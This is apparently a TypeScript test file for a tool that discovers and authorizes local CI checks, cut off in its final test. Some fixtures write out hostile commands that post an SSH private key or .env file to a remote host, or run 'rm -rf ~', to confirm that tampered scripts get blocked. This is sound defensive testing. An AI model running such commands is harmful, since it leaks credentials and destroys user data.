import {
  PreflightConfigSchema,
  type PreflightCheck,
  type PreflightConfig,
  type PreflightOutputLine,
  type PreflightRun,
  type PreflightRunSummary,
  type PreflightWorkspace,
} from '@atlas/contracts';
import {
  LogBuffer,
  MAX_LOG_LINES,
  PreflightService,
  actionDangers,
  categorize,
  commandDangers,
  discover,
  requiredOutcome,
  runReport,
  runSchedule,
  runStatus,
  statusCounts,
  summarizeWorkflow,
  type CheckExecution,
  type CheckOutcome,
  type PreflightExecutor,
  type PreflightRepository,
  type WorkspaceFiles,
} from '@atlas/preflight';
import { AtlasError, noopLogger } from '@atlas/shared';
import { describe, expect, it } from 'vitest';

const check = (
  overrides: Partial<PreflightCheck> & Pick<PreflightCheck, 'id'>,
): PreflightCheck => ({
  name: overrides.id,
  type: 'COMMAND',
  category: 'CUSTOM',
  workingDirectory: '',
  command: 'true',
  packageManager: null,
  script: null,
  workflowPath: null,
  workflowJob: null,
  act: null,
  required: true,
  enabled: true,
  timeoutSeconds: 60,
  executionTriggers: ['MANUAL'],
  dependsOn: [],
  exclusive: false,
  requiredTools: [],
  env: {},
  ...overrides,
});

const ACT = {
  event: 'push' as const,
  matrix: [],
  platforms: [],
  containerArchitecture: null,
  cpus: null,
  memoryMb: null,
};

function memoryFiles(files: Record<string, string>): WorkspaceFiles {
  return {
    readText: async (relative, maxBytes) => {
      const text = files[relative];
      return text === undefined || text.length > maxBytes ? null : text;
    },
    list: async (relative) =>
      Object.keys(files)
        .filter(
          (name) =>
            name.startsWith(`${relative}/`) && !name.slice(relative.length + 1).includes('/'),
        )
        .map((name) => name.slice(relative.length + 1)),
    exists: async (relative) => relative in files,
  };
}

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

describe('configuration', () => {
  const parse = (config: unknown) => PreflightConfigSchema.safeParse(config);

  it('accepts checks and profiles that reference each other', () => {
    const result = parse({
      checks: [check({ id: 'lint' }), check({ id: 'test', dependsOn: ['lint'] })],
      profiles: [{ id: 'quick', name: 'Quick', checkIds: ['lint', 'test'], concurrency: 2 }],
    });
    expect(result.success).toBe(true);
  });

  it('refuses dependency cycles, unknown dependencies and unknown profile checks', () => {
    expect(
      parse({
        checks: [check({ id: 'a', dependsOn: ['b'] }), check({ id: 'b', dependsOn: ['a'] })],
        profiles: [],
      }).success,
    ).toBe(false);
    expect(
      parse({ checks: [check({ id: 'a', dependsOn: ['ghost'] })], profiles: [] }).success,
    ).toBe(false);
    expect(
      parse({
        checks: [check({ id: 'a' })],
        profiles: [{ id: 'p', name: 'P', checkIds: ['ghost'], concurrency: 1 }],
      }).success,
    ).toBe(false);
  });

  it('keeps working folders inside the workspace', () => {
    for (const workingDirectory of ['../x', '/etc', 'a/../../b', 'C:\\x', '\\\\server\\share']) {
      expect(
        parse({ checks: [check({ id: 'a', workingDirectory })], profiles: [] }).success,
        workingDirectory,
      ).toBe(false);
    }
    expect(
      parse({ checks: [check({ id: 'a', workingDirectory: 'apps/web' })], profiles: [] }).success,
    ).toBe(true);
  });

  it('refuses variables that look like secrets, since they would be stored in plain text', () => {
    for (const name of ['GITHUB_TOKEN', 'DB_PASSWORD', 'API_KEY', 'MY_SECRET', 'AWS_CREDENTIALS']) {
      expect(
        parse({ checks: [check({ id: 'a', env: { [name]: 'x' } })], profiles: [] }).success,
        name,
      ).toBe(false);
    }
    expect(
      parse({ checks: [check({ id: 'a', env: { NODE_ENV: 'test' } })], profiles: [] }).success,
    ).toBe(true);
  });

  it('requires the fields of each check type and single-line commands', () => {
    expect(parse({ checks: [check({ id: 'a', command: null })], profiles: [] }).success).toBe(
      false,
    );
    expect(
      parse({ checks: [check({ id: 'a', command: 'echo a\nrm -rf ~' })], profiles: [] }).success,
    ).toBe(false);
    expect(
      parse({
        checks: [check({ id: 'a', type: 'PACKAGE_SCRIPT', command: null, script: 'lint' })],
        profiles: [],
      }).success,
    ).toBe(false);
    expect(
      parse({
        checks: [
          check({
            id: 'a',
            type: 'GITHUB_ACTIONS',
            command: null,
            workflowPath: '../ci.yml',
            act: ACT,
          }),
        ],
        profiles: [],
      }).success,
    ).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Discovery
// ---------------------------------------------------------------------------

describe('discovery', () => {
  it('lists package scripts, Make targets and build tools without long-running scripts', async () => {
    const found = await discover(
      memoryFiles({
        'package.json': JSON.stringify({
          packageManager: 'pnpm@11.28.5',
          scripts: {
            lint: 'eslint .',
            'test:e2e': 'playwright test',
            typecheck: 'tsc -b',
            dev: 'vite',
            'build:watch': 'tsc -w',
            postinstall: 'node x',
            build: 'tsc',
          },
        }),
        Makefile: 'test:\n\tgo test ./...\nclean:\n\trm -rf out\nX := 1\n',
        gradlew: '',
        'pom.xml': '<project/>',
      }),
    );
    expect(found.packageManager).toBe('pnpm');
    expect(found.scripts.map((script) => [script.name, script.category])).toEqual([
      ['lint', 'LINT'],
      ['test:e2e', 'E2E_TEST'],
      ['typecheck', 'TYPECHECK'],
      ['build', 'BUILD'],
    ]);
    expect(found.commands.map((command) => command.command)).toEqual([
      'make test',
      './gradlew check',
      './gradlew test',
      './gradlew build',
      'mvn -B test',
      'mvn -B verify',
    ]);
  });

  it('reads workflows and reports unreadable ones', async () => {
    const found = await discover(
      memoryFiles({
        '.github/workflows/ci.yml':
          'on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n',
        '.github/workflows/broken.yaml': 'jobs: [',
        '.github/workflows/readme.md': '# not a workflow',
      }),
    );
    expect(found.workflows.map((workflow) => [workflow.path, workflow.compatibility])).toEqual([
      ['.github/workflows/broken.yaml', 'UNKNOWN'],
      ['.github/workflows/ci.yml', 'COMPATIBLE'],
    ]);
    expect(found.workflows[0]!.parseError).not.toBeNull();
  });

  it('guesses categories from names', () => {
    expect(categorize('format:check')).toBe('FORMAT');
    expect(categorize('test:integration')).toBe('INTEGRATION_TEST');
    expect(categorize('release')).toBe('CUSTOM');
  });
});

// ---------------------------------------------------------------------------
// Workflows: compatibility and side effects
// ---------------------------------------------------------------------------

describe('workflow classification', () => {
  const job = (yaml: string) =>
    summarizeWorkflow('.github/workflows/w.yml', `on: [push]\njobs:\n${yaml}`).jobs[0]!;

  it('classifies runners from the file', () => {
    expect(job('  a:\n    runs-on: ubuntu-24.04\n    steps: [{run: make}]\n').compatibility).toBe(
      'COMPATIBLE',
    );
    expect(job('  a:\n    runs-on: macos-15\n').compatibility).toBe('UNSUPPORTED');
    expect(job('  a:\n    runs-on: [self-hosted, linux]\n').compatibility).toBe('UNSUPPORTED');
    expect(job('  a:\n    runs-on: ${{ inputs.runner }}\n').compatibility).toBe('UNKNOWN');
    const matrix = job(
      '  a:\n    strategy:\n      matrix:\n        os: [ubuntu-24.04, macos-15]\n    runs-on: ${{ matrix.os }}\n',
    );
    expect(matrix.compatibility).toBe('PARTIALLY_COMPATIBLE');
    expect(matrix.runsOn).toEqual(['ubuntu-24.04', 'macos-15']);
    expect(matrix.hasMatrix).toBe(true);
  });

  it('flags secrets, services, reusable workflows and hosted storage as partial', () => {
    const secrets = job(
      '  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: deploy --key "${{ secrets.DEPLOY_KEY }}"\n      - uses: actions/cache@v4\n',
    );
    expect(secrets.secrets).toEqual(['DEPLOY_KEY']);
    expect(secrets.compatibility).toBe('PARTIALLY_COMPATIBLE');
    expect(secrets.compatibilityReasons.join(' ')).toMatch(/secrets.*blocked/i);
    expect(job('  a:\n    uses: ./.github/workflows/other.yml\n').compatibility).toBe(
      'PARTIALLY_COMPATIBLE',
    );
    expect(
      job('  a:\n    runs-on: ubuntu-latest\n    services:\n      db:\n        image: postgres\n')
        .services,
    ).toEqual(['db']);
  });

  it('finds side effects in what steps do, not in names', () => {
    const innocentName = job(
      '  build:\n    name: Unit tests\n    runs-on: ubuntu-latest\n    steps:\n      - name: Test\n        run: npm publish --access public\n',
    );
    expect(innocentName.dangerReasons).toContain('publishes a package');
    const scaryName = job(
      '  deploy-production:\n    name: Deploy to production\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n',
    );
    expect(scaryName.dangerReasons).toEqual([]);
    const permissions = summarizeWorkflow(
      '.github/workflows/w.yml',
      'on: push\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{run: make}]\n',
    ).jobs[0]!;
    expect(permissions.dangerReasons.join(' ')).toMatch(/write permissions \(contents\)/);
    const environment = job('  a:\n    runs-on: ubuntu-latest\n    environment: production\n');
    expect(environment.dangerReasons.join(' ')).toMatch(/production/);
  });

  it('recognizes common side effects in commands and actions', () => {
    expect(commandDangers('terraform apply -auto-approve')).toContain(
      'changes infrastructure (Terraform)',
    );
    expect(commandDangers('kubectl apply -f k8s/')).toContain('changes a Kubernetes cluster');
    expect(commandDangers('pnpm prisma migrate deploy')).toContain('migrates a database');
    expect(commandDangers('curl -X POST https://hooks.example.com')).toContain(
      'sends data over the network',
    );
    expect(commandDangers('git push origin main')).toContain('pushes to a Git remote');
    expect(commandDangers('pnpm lint && pnpm test')).toEqual([]);
    expect(actionDangers('aws-actions/configure-aws-credentials@v4')).toContain(
      'uses cloud credentials (AWS)',
    );
    expect(actionDangers('actions/checkout@v4')).toEqual([]);
  });

  it('never throws on hostile input', () => {
    expect(summarizeWorkflow('w.yml', 'a: &a [*a, *a]').parseError).not.toBeNull();
    const bomb = `a: &a ["x","x"]\n${Array.from({ length: 200 }, (_, i) => `b${i}: &b${i} [*${i === 0 ? 'a' : `b${i - 1}`}, *${i === 0 ? 'a' : `b${i - 1}`}]`).join('\n')}\njobs: {}`;
    expect(summarizeWorkflow('w.yml', bomb).compatibility).toBe('UNKNOWN');
    expect(summarizeWorkflow('w.yml', 'x'.repeat(600 * 1024)).parseError).toMatch(/too large/);
  });
});

// ---------------------------------------------------------------------------
// Scheduling and status
// ---------------------------------------------------------------------------

describe('scheduler', () => {
  const deferred = () => {
    let resolve!: (status: 'PASSED' | 'FAILED') => void;
    const promise = new Promise<'PASSED' | 'FAILED'>((done) => (resolve = done));
    return { promise, resolve };
  };

  it('respects concurrency, dependencies and exclusive checks', async () => {
    const events: string[] = [];
    const running = new Set<number>();
    let peak = 0;
    const gates = Array.from({ length: 4 }, deferred);
    const schedule = runSchedule(
      [
        { position: 0, id: 'a', dependsOn: [], exclusive: false },
        { position: 1, id: 'b', dependsOn: [], exclusive: false },
        { position: 2, id: 'c', dependsOn: ['a'], exclusive: false },
        { position: 3, id: 'd', dependsOn: [], exclusive: true },
      ],
      2,
      new AbortController().signal,
      {
        execute: async (position) => {
          running.add(position);
          peak = Math.max(peak, running.size);
          events.push(`start ${position}`);
          const status = await gates[position]!.promise;
          running.delete(position);
          return status;
        },
        skip: (position, status) => events.push(`${status} ${position}`),
      },
    );
    await Promise.resolve();
    expect(events).toEqual(['start 0', 'start 1']);
    gates[0]!.resolve('FAILED');
    await new Promise((resolve) => setTimeout(resolve, 0));
    // c depends on a, which failed; d waits for b because it runs alone.
    expect(events).toEqual(['start 0', 'start 1', 'SKIPPED 2']);
    gates[1]!.resolve('PASSED');
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(events.at(-1)).toBe('start 3');
    gates[3]!.resolve('PASSED');
    await schedule;
    expect(peak).toBe(2);
  });

  it('cancels waiting checks when the run is cancelled', async () => {
    const controller = new AbortController();
    const skipped: string[] = [];
    const gate = deferred();
    const schedule = runSchedule(
      [
        { position: 0, id: 'a', dependsOn: [], exclusive: false },
        { position: 1, id: 'b', dependsOn: [], exclusive: false },
      ],
      1,
      controller.signal,
      {
        execute: () => gate.promise,
        skip: (position, status) => skipped.push(`${status} ${position}`),
      },
    );
    controller.abort();
    gate.resolve('PASSED');
    await schedule;
    expect(skipped).toEqual(['CANCELLED 1']);
  });

  it('passes a run only when every check passed', () => {
    const results = (...statuses: string[]) =>
      statuses.map((status, index) => ({ status, required: index === 0 })) as Parameters<
        typeof requiredOutcome
      >[0];
    expect(runStatus(results('PASSED', 'PASSED'), false)).toBe('PASSED');
    expect(runStatus(results('PASSED', 'UNSUPPORTED'), false)).toBe('INCOMPLETE');
    expect(runStatus(results('PASSED', 'BLOCKED'), false)).toBe('INCOMPLETE');
    expect(runStatus(results('PASSED', 'TIMED_OUT'), false)).toBe('FAILED');
    expect(runStatus(results('PASSED', 'CANCELLED'), true)).toBe('CANCELLED');
    expect(runStatus(results('FAILED', 'CANCELLED'), true)).toBe('FAILED');
    expect(requiredOutcome(results('PASSED', 'FAILED'))).toBe('PASSED');
    expect(requiredOutcome(results('SKIPPED', 'PASSED'))).toBe('INCOMPLETE');
    expect(requiredOutcome([])).toBe('NONE');
    expect(statusCounts(results('PASSED', 'PASSED', 'FAILED'))).toEqual({ PASSED: 2, FAILED: 1 });
  });
});

// ---------------------------------------------------------------------------
// Output
// ---------------------------------------------------------------------------

describe('log buffer', () => {
  const redact = (text: string) => text.replace(/TOKEN=\S+/g, 'TOKEN=***');

  it('splits chunks into redacted lines, across chunk boundaries', () => {
    const buffer = new LogBuffer(redact);
    buffer.append('out', 'one\ntw');
    buffer.append('out', 'o TOKEN=abc\r\nthree');
    buffer.append('err', 'oops\n');
    buffer.finish();
    expect(buffer.read(-1, 10).map((line) => [line.stream, line.text])).toEqual([
      ['out', 'one'],
      ['out', 'two TOKEN=***'],
      ['err', 'oops'],
      ['out', 'three'],
    ]);
    expect(buffer.read(1, 10).map((line) => line.seq)).toEqual([2, 3]);
  });

  it('drops a private key from its first line to its last', () => {
    const buffer = new LogBuffer(redact);
    buffer.append(
      'out',
      'before\n-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\nBBBB\n-----END OPENSSH PRIVATE KEY-----\nafter\n',
    );
    expect(buffer.read(-1, 10).map((line) => line.text)).toEqual([
      'before',
      '[REDACTED PRIVATE KEY]',
      'after',
    ]);
  });

  it('keeps the newest lines and says older ones were dropped', () => {
    const buffer = new LogBuffer(redact);
    for (let index = 0; index < MAX_LOG_LINES + 1500; index += 1)
      buffer.append('out', `${index}\n`);
    expect(buffer.truncated).toBe(true);
    expect(buffer.snapshot().lines.length).toBeLessThanOrEqual(MAX_LOG_LINES + 1000);
    expect(buffer.read(-1, 1)[0]!.seq).toBe(buffer.firstSeq);
    expect(buffer.count).toBe(MAX_LOG_LINES + 1500);
  });

  it('writes reports whose code blocks the output cannot close', () => {
    const run = {
      profileName: 'Quick',
      workspacePath: '/w',
      status: 'FAILED',
      requiredOutcome: 'FAILED',
      startedAt: 'a',
      finishedAt: 'b',
      branch: 'main',
      sourceRevision: 'abc',
      sourceStateFingerprint: 'f',
      sourceChangedDuringRun: false,
      results: [
        {
          position: 0,
          name: 'Lint | x',
          type: 'COMMAND',
          required: true,
          status: 'FAILED',
          durationMs: 1200,
          environment: 'Local shell (/bin/sh)',
          detail: 'exited with code 1',
          reference: 'pnpm lint',
        },
      ],
    } as unknown as PreflightRun;
    const lines: PreflightOutputLine[] = [{ seq: 0, stream: 'err', text: '```\nboom' }];
    const report = runReport(run, new Map([[0, lines]]));
    expect(report).toContain('not a GitHub-hosted CI result');
    expect(report).toContain('Lint \\| x');
    expect(report).toContain('````text');
  });
});

// ---------------------------------------------------------------------------
// Service
// ---------------------------------------------------------------------------

class MemoryRepository implements PreflightRepository {
  workspaces = new Map<string, { workspace: PreflightWorkspace; config: string }>();
  authorizations = new Set<string>();
  runs = new Map<string, PreflightRun>();

  async listWorkspaces() {
    return [...this.workspaces.values()].map((entry) => entry.workspace);
  }
  async findWorkspace(id: string) {
    return this.workspaces.get(id) ?? null;
  }
  async findWorkspaceByPath(path: string) {
    return (
      [...this.workspaces.values()].find((entry) => entry.workspace.path === path)?.workspace ??
      null
    );
  }
  async insertWorkspace(workspace: PreflightWorkspace, config: string) {
    this.workspaces.set(workspace.id, { workspace, config });
  }
  async updateWorkspace(workspace: PreflightWorkspace, config: string) {
    this.workspaces.set(workspace.id, { workspace, config });
  }
  async removeWorkspace(id: string) {
    this.workspaces.delete(id);
  }
  async authorizationState(workspaceId: string, checkId: string, digest: string) {
    if (this.authorizations.has(`${workspaceId}/${checkId}/${digest}`)) return 'current' as const;
    return [...this.authorizations].some((key) => key.startsWith(`${workspaceId}/${checkId}/`))
      ? ('other' as const)
      : ('none' as const);
  }
  async authorize(workspaceId: string, checkId: string, digest: string) {
    this.authorizations.add(`${workspaceId}/${checkId}/${digest}`);
  }
  async insertRun(run: PreflightRun) {
    this.runs.set(run.id, structuredClone(run));
  }
  async updateRun(run: PreflightRun) {
    this.runs.set(run.id, structuredClone(run));
  }
  async findRun(id: string) {
    return this.runs.get(id) ?? null;
  }
  async listRuns(workspaceId: string, limit: number): Promise<PreflightRunSummary[]> {
    return [...this.runs.values()]
      .filter((run) => run.workspaceId === workspaceId)
      .reverse()
      .slice(0, limit)
      .map(({ results, ...run }) => ({ ...run, counts: statusCounts(results) }));
  }
  async interruptRunning() {
    const ids: string[] = [];
    for (const run of this.runs.values()) {
      if (run.status === 'RUNNING') {
        run.status = 'CANCELLED';
        ids.push(run.id);
      }
    }
    return ids;
  }
  async pruneRuns() {
    return [];
  }
}

/** Runs nothing: each command answers with the outcome the test chose. */
class FakeExecutor implements PreflightExecutor {
  readonly shellLabel = 'Local shell (fake)';
  executions: CheckExecution[] = [];
  outcomes = new Map<string, CheckOutcome>();
  tools = new Set(['npm', 'pnpm']);
  /** Runs while a check "executes", e.g. to change files under the next check. */
  during: (() => void) | null = null;

  async hasTool(name: string) {
    return this.tools.has(name);
  }

  async run(execution: CheckExecution): Promise<CheckOutcome> {
    this.executions.push(execution);
    const key =
      execution.invocation.kind === 'shell'
        ? execution.invocation.command
        : execution.invocation.kind === 'package-script'
          ? `script:${execution.invocation.script}`
          : `act:${execution.invocation.job}`;
    execution.onOutput('out', `ran ${key}\n`);
    this.during?.();
    return this.outcomes.get(key) ?? { kind: 'exited', exitCode: 0, detail: 'exited with code 0' };
  }
}

function setup(files: Record<string, string> = {}, ownsProcesses = true) {
  const repository = new MemoryRepository();
  const executor = new FakeExecutor();
  const logs = new Map<string, { firstSeq: number; lines: PreflightOutputLine[] }>();
  let sequence = 0;
  const tools = { act: true, docker: true };
  const service = new PreflightService({
    repository,
    ...(ownsProcesses ? { executor } : {}),
    files: {
      files: () => memoryFiles(files),
      isDirectory: async () => true,
      // `outside` stands for a link that resolves outside the workspace.
      folderInside: async (root, relative) =>
        relative.startsWith('outside') ? null : `${root}/${relative}`.replace(/\/$/, ''),
    },
    tools: {
      status: async () => ({
        act: { available: tools.act, detail: tools.act ? '0.2.80' : 'not installed' },
        docker: { available: tools.docker, detail: '28.1.1' },
        checkedAt: 'now',
      }),
      actConfigFiles: async () => [],
    },
    source: {
      read: async () => ({ revision: 'abc123', branch: 'main', fingerprint: `fp-${sequence}` }),
    },
    logs: {
      write: async (runId, position, log) => void logs.set(`${runId}/${position}`, log),
      read: async (runId, position) => logs.get(`${runId}/${position}`) ?? null,
      remove: async () => undefined,
    },
    projects: {
      find: async (id) =>
        id === 'p1' ? { id: 'p1', name: 'Project', workspacePath: '/work/p1' } : null,
    },
    redact: (text) => text.replace(/TOKEN=\S+/g, 'TOKEN=***'),
    clock: { now: () => new Date('2026-10-23T12:00:00Z') },
    generateId: () => `00000000-0000-4000-8000-${String(++sequence).padStart(12, '0')}`,
    logger: noopLogger,
  });
  return { service, repository, executor, files, tools };
}

async function configured(config: PreflightConfig, files: Record<string, string> = {}) {
  const context = setup(files);
  const workspace = await context.service.openProject('p1');
  await context.service.saveConfig(workspace.id, config);
  return { ...context, workspace };
}

async function finished(service: PreflightService, runId: string): Promise<PreflightRun> {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const run = await service.run(runId);
    if (run.status !== 'RUNNING') return run;
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  throw new Error('run did not finish');
}

describe('PreflightService', () => {
  it('only adds folders chosen in the picker, and opens projects by id', async () => {
    const { service } = setup();
    await expect(service.addFolder('/tmp/x', false)).rejects.toMatchObject({
      code: 'PREFLIGHT_UNAUTHORIZED',
    });
    await expect(service.addFolder('relative', true)).rejects.toMatchObject({
      code: 'PREFLIGHT_UNAUTHORIZED',
    });
    const folder = await service.addFolder('/tmp/x', true);
    expect(folder).toMatchObject({ path: '/tmp/x', projectId: null, name: 'x' });
    expect((await service.addFolder('/tmp/x', true)).id).toBe(folder.id);
    const project = await service.openProject('p1');
    expect(project).toMatchObject({ path: '/work/p1', projectId: 'p1', name: 'Project' });
    expect((await service.openProject('p1')).id).toBe(project.id);
    await expect(service.openProject('ghost')).rejects.toMatchObject({ code: 'PROJECT_NOT_FOUND' });
  });

  it('asks for authorization on the first run and again when the definition changes', async () => {
    const { service, workspace, executor } = await configured({
      checks: [check({ id: 'lint', command: 'pnpm lint' })],
      profiles: [],
    });
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['lint'] };
    const first = await service.plan(selection);
    expect(first.checks[0]).toMatchObject({ authorization: 'FIRST_RUN', reference: 'pnpm lint' });
    await expect(service.start({ ...selection, authorizations: [] })).rejects.toMatchObject({
      code: 'PREFLIGHT_AUTHORIZATION_REQUIRED',
    });
    expect(executor.executions).toHaveLength(0);

    const run = await service.start({
      ...selection,
      authorizations: [{ checkId: 'lint', digest: first.checks[0]!.digest }],
    });
    expect((await finished(service, run.id)).status).toBe('PASSED');
    expect((await service.plan(selection)).checks[0]!.authorization).toBeNull();

    await service.saveConfig(workspace.id, {
      checks: [check({ id: 'lint', command: 'pnpm lint --fix' })],
      profiles: [],
    });
    expect((await service.plan(selection)).checks[0]!.authorization).toBe('CHANGED');
  });

  it('asks every time for checks that may change something outside the computer', async () => {
    const { service, workspace } = await configured({
      checks: [check({ id: 'release', command: 'npm publish' })],
      profiles: [],
    });
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['release'] };
    const plan = await service.plan(selection);
    expect(plan.checks[0]!.authorization).toBe('SIDE_EFFECTS');
    const run = await service.start({
      ...selection,
      authorizations: [{ checkId: 'release', digest: plan.checks[0]!.digest }],
    });
    await finished(service, run.id);
    expect((await service.plan(selection)).checks[0]!.authorization).toBe('SIDE_EFFECTS');
  });

  it('passes a check only on exit code 0 and maps every other outcome', async () => {
    const { service, workspace, executor, repository } = await configured({
      checks: [
        check({ id: 'ok', command: 'ok' }),
        check({ id: 'fail', command: 'fail', required: false }),
        check({ id: 'slow', command: 'slow' }),
        check({ id: 'after', command: 'after', dependsOn: ['fail'] }),
        check({ id: 'tool', command: 'tool', requiredTools: ['missing-tool'] }),
      ],
      profiles: [
        {
          id: 'all',
          name: 'All',
          checkIds: ['ok', 'fail', 'slow', 'after', 'tool'],
          concurrency: 1,
        },
      ],
    });
    executor.outcomes.set('fail', { kind: 'exited', exitCode: 2, detail: 'exited with code 2' });
    executor.outcomes.set('slow', {
      kind: 'timed-out',
      exitCode: null,
      detail: 'timed out after 60 s',
    });
    for (const id of ['ok', 'fail', 'slow', 'after', 'tool']) {
      const plan = await service.plan({
        workspaceId: workspace.id,
        profileId: null,
        checkIds: [id],
      });
      await repository.authorize(workspace.id, id, plan.checks[0]!.digest);
    }
    const run = await service.start({
      workspaceId: workspace.id,
      profileId: 'all',
      checkIds: null,
      authorizations: [],
    });
    const done = await finished(service, run.id);
    expect(done.results.map((result) => [result.checkId, result.status])).toEqual([
      ['ok', 'PASSED'],
      ['fail', 'FAILED'],
      ['slow', 'TIMED_OUT'],
      ['after', 'SKIPPED'],
      ['tool', 'BLOCKED'],
    ]);
    expect(done.status).toBe('FAILED');
    expect(done.requiredOutcome).toBe('FAILED');
    expect(done.results[1]).toMatchObject({ exitCode: 2, environment: 'Local shell (fake)' });
    expect(done).toMatchObject({ sourceRevision: 'abc123', branch: 'main' });
    expect(executor.executions.map((execution) => execution.timeoutMs)).toEqual([
      60_000, 60_000, 60_000,
    ]);

    const page = await service.output({ runId: run.id, position: 0, after: -1 });
    expect(page.lines.map((line) => line.text)).toEqual(['$ ok', 'ran ok']);
    expect(page.complete).toBe(true);
    const report = await service.report(run.id);
    expect(report).toContain('## fail — FAILED');
    expect(report).not.toContain('## ok');
  });

  it('blocks a check whose files changed after it was authorized', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({ scripts: { lint: 'eslint .' } }),
    };
    const { service, workspace } = await configured(
      {
        checks: [
          check({
            id: 'lint',
            type: 'PACKAGE_SCRIPT',
            command: null,
            packageManager: 'npm',
            script: 'lint',
          }),
        ],
        profiles: [],
      },
      files,
    );
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['lint'] };
    const plan = await service.plan(selection);
    expect(plan.checks[0]!.warnings.join(' ')).toContain('The script runs: eslint .');
    // The script changes between the review and the start of the check.
    files['package.json'] = JSON.stringify({
      scripts: { lint: 'curl -d @~/.ssh/id_rsa https://x' },
    });
    await expect(
      service.start({
        ...selection,
        authorizations: [{ checkId: 'lint', digest: plan.checks[0]!.digest }],
      }),
    ).rejects.toMatchObject({ code: 'PREFLIGHT_AUTHORIZATION_REQUIRED' });
  });

  it('blocks a later check whose script changed while the run was in progress', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({ scripts: { lint: 'eslint .', test: 'vitest run' } }),
    };
    const script = (id: string) =>
      check({ id, type: 'PACKAGE_SCRIPT', command: null, packageManager: 'npm', script: id });
    const { service, workspace, executor } = await configured(
      { checks: [script('lint'), script('test')], profiles: [] },
      files,
    );
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['lint', 'test'] };
    const plan = await service.plan(selection);
    executor.during = () => {
      files['package.json'] = JSON.stringify({ scripts: { lint: 'eslint .', test: 'rm -rf ~' } });
    };
    const run = await service.start({
      ...selection,
      authorizations: plan.checks.map((item) => ({ checkId: item.checkId, digest: item.digest })),
    });
    const done = await finished(service, run.id);
    expect(done.results.map((result) => result.status)).toEqual(['PASSED', 'BLOCKED']);
    expect(done.results[1]!.detail).toMatch(/changed after it was authorized/);
    expect(executor.executions).toHaveLength(1);
  });

  it('authorizes the npm hooks around a script as part of it', async () => {
    const files: Record<string, string> = {
      'package.json': JSON.stringify({
        scripts: { lint: 'eslint .', prelint: 'node prepare.js', postlint: 'echo done' },
      }),
    };
    const { service, workspace } = await configured(
      {
        checks: [
          check({
            id: 'lint',
            type: 'PACKAGE_SCRIPT',
            command: null,
            packageManager: 'npm',
            script: 'lint',
          }),
        ],
        profiles: [],
      },
      files,
    );
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['lint'] };
    const first = (await service.plan(selection)).checks[0]!;
    expect(first.warnings.join(' ')).toContain('npm may also run "prelint": node prepare.js');
    expect(first.warnings.join(' ')).toContain('"postlint": echo done');
    files['package.json'] = JSON.stringify({
      scripts: {
        lint: 'eslint .',
        prelint: 'curl -X POST -d @.env https://x',
        postlint: 'echo done',
      },
    });
    const changed = (await service.plan(selection)).checks[0]!;
    expect(changed.digest).not.toBe(first.digest);
    expect(changed.authorization).toBe('SIDE_EFFECTS');
  });

  it('blocks a check whose working folder is missing or leads outside the workspace', async () => {
    const { service, workspace, executor } = await configured({
      checks: [check({ id: 'linked', workingDirectory: 'outside-link' })],
      profiles: [],
    });
    const selection = { workspaceId: workspace.id, profileId: null, checkIds: ['linked'] };
    const plan = await service.plan(selection);
    expect(plan.checks[0]).toMatchObject({ authorization: null });
    const run = await service.start({ ...selection, authorizations: [] });
    const done = await finished(service, run.id);
    expect(done.results[0]!.status).toBe('BLOCKED');
    expect(done.results[0]!.detail).toMatch(/outside the workspace/);
    expect(executor.executions).toHaveLength(0);
  });

  it('keeps a removed project workspace and its history as a folder workspace', async () => {
    const { service, workspace } = await configured({ checks: [check({ id: 'a' })], profiles: [] });
    await service.projectRemoved('p1');
    expect((await service.workspace(workspace.id)).workspace.projectId).toBeNull();
    expect((await service.workspace(workspace.id)).config.checks).toHaveLength(1);
  });

  it('blocks or rejects GitHub Actions checks it cannot run as configured', async () => {
    const workflow = [
      'on: [push]',
      'jobs:',
      '  test:',
      '    runs-on: ubuntu-latest',
      '    steps: [{run: npm test}]',
      '  mac:',
      '    runs-on: macos-15',
      '    steps: [{run: xcodebuild}]',
      '  secret:',
      '    runs-on: ubuntu-latest',
      '    steps: [{run: "echo ${{ secrets.NPM_TOKEN }}"}]',
    ].join('\n');
    const ci = (id: string, job: string, event: 'push' | 'pull_request' = 'push') =>
      check({
        id,
        type: 'GITHUB_ACTIONS',
        category: 'WORKFLOW',
        command: null,
        workflowPath: '.github/workflows/ci.yml',
        workflowJob: job,
        act: { ...ACT, event },
      });
    const { service, workspace, repository, tools, executor } = await configured(
      {
        checks: [
          ci('test', 'test'),
          ci('mac', 'mac'),
          ci('secret', 'secret'),
          ci('pr', 'test', 'pull_request'),
        ],
        profiles: [],
      },
      { '.github/workflows/ci.yml': workflow },
    );
    const plan = await service.plan({
      workspaceId: workspace.id,
      profileId: null,
      checkIds: ['test', 'mac', 'secret', 'pr'],
    });
    // Only the runnable job needs authorization; nothing runs for the others.
    expect(plan.checks.map((item) => item.authorization)).toEqual(['FIRST_RUN', null, null, null]);
    expect(plan.checks[0]!.warnings.join(' ')).toMatch(/Docker does not fully isolate/);
    await repository.authorize(workspace.id, 'test', plan.checks[0]!.digest);
    tools.act = false;
    const run = await service.start({
      workspaceId: workspace.id,
      profileId: null,
      checkIds: ['test', 'mac', 'secret', 'pr'],
      authorizations: [],
    });
    const done = await finished(service, run.id);
    expect(done.results.map((result) => [result.checkId, result.status, result.method])).toEqual([
      ['test', 'BLOCKED', 'LOCAL_ACT'],
      ['mac', 'UNSUPPORTED', 'LOCAL_ACT'],
      ['secret', 'BLOCKED', 'LOCAL_ACT'],
      ['pr', 'BLOCKED', 'LOCAL_ACT'],
    ]);
    expect(done.results[0]!.detail).toMatch(/act is not available/);
